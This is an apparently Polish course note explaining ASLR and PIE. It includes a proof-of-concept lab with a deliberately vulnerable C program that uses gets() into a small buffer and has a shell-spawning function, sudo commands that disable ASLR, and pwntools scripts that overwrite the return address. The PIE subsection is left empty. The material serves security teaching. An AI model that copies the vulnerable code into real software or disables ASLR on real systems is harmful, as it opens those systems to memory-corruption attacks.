# 1. ASLR & PIE

Techniki obrony ASLR i PIE są ze sobą sciśle powiązane, dlatego ich omówienie znajduję się w jednym pliku.

### 1.1 PIE

PIE (Position indepented executable) 

### 1.2 ASLR

ASLR (Address space layout randomization) - to technika polegająca na losowym umieszczeniu sekcji programu, aby uniemożliwić
skakanie do danych sekcji. Jest to dość duże utrudnienie w atakach binarnych. W dużej cześci ataków oznacza to po prostu zgadywanie danej wartości do skutku.

Główna róznica pomiedzy implementacją Linuxową i Windowsową jest to, że w Linuxie jest to opcja compile-time, a w Windowsie link-time.

W Linuxie ASLR jest implementowane w kernelu. Na linuxie ASLR ma wpływ na performance przez to, że binarki obsługujące ASLR muszą być kompilowane z PIE (Position Independent Executable), co prowadzi nawet do 25% gorszego performance'u na 32bit x86. 

Na Windowsie ASLR jest włączany poprzez linkowanie z opcja `/DYNAMICBASE`. Na windowsie wpływ na performance run-time jest raczej niewielki, ale ASLR może spowolnić ładowanie modułów.

### 1.3 Proof of Concept 

Exploit nie używa wykonalnego stosu.

Przed wykonaniem tego exploitu wyłączyłem ASLR w swoim systemie. Odbywa się to za pomocą ustawienia flagi w systemie.

Można to zrobić np. tak `echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`.

Aby ASLR włączyć na nowo należy ustawić flagę na 2 - ``echo "2" | sudo dd of=/proc/sys/kernel/randomize_va_space``.

Kod programu, który bedzie exploitować jest następujący:

```c
// gcc vuln.c -no-pie -std=c99 -m32 -fno-stack-protector -z execstack -w -o vuln.o

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void secret() {
system("sh");
}
void ask_for_name()
{
char name[12] = {0};
puts("What's your name?");
gets(name);
printf("Hi %s!\n", name);
}

int main()
{
ask_for_name();
return 0;
}
```

Chcę wywołać funkcję secret spawnującą shella. Aby to zrobić chce nadpisać adres powrotu funkcji `ask_for_name()` na właśnie tą funkcje.

Na początku staram się otrzymać lokalizacje rejestru `eip` przesyłając do ofiary duży string z podłączonym debuggerem.


```python
from pwn import *

p = process("./vuln.o")

p.readuntil("What's your name?\n")

name = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO"

p.sendline(name)
```

![img.png](img.png)


W rejestr `eip` trafiła litera G. Co pozwala mi ustalić miejsce, w które wstrzykne adres funkcji secret().

Adres funkcji `secret()` uzyskam używając gdb.

![img_2.png](img_2.png)

Adres ten muszę też przekształcić do little endian.



```python
from pwn import *

p = process("./vuln.o")

name = b'AAAABBBBCCCCDDDDEEEEFFFF'
name += b'\xc9\x61\x55\x56'

p.sendline(name)
```

W tym momencie exploit powinien działać i wywoływać funkcję secret.

![img_1.png](img_1.png)

Exploit działa jeśli flaga od ASLR jest ustawiona na 0.

W momencie ustawienia jej na 2 exploit nie działa - adres, który nadpisuję nie jest adresem funkcji `secret`.

![img_3.png](img_3.png)

Adres, który wywołuje `eip` jest losowym adresem, więc wykonanie konczy się `SIGSEGV`, bo program chciał odnieść się do zabronionej dla niego pamięci.
